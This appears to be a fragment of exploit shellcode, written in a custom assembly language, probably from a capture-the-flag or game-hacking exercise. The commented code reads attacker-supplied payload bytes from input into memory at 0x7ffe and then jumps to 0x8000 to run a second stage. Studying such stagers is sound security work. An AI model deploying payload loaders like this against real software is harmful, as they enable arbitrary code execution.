xor r1, 0x209b ; r1 points to first player object at 0x2002
               ; this will set r1 to 0x0099
mov r3, 0x7ffe ; we will start this payload at 0x7ffe with 2 bytes of spacer
               ; this is because our mov rip, ADDR will hav the last byte
               ; chopped off and must end in 0x00
read_payload :
    in r2
    storb r3, r2 ; write payload byte
    sub r3, -1
    cmp r2, r1 ; if we have not reached final byte, keep reading input,
               ; else go to stage 2
    jne read_payload
    mov rip, 0x8000
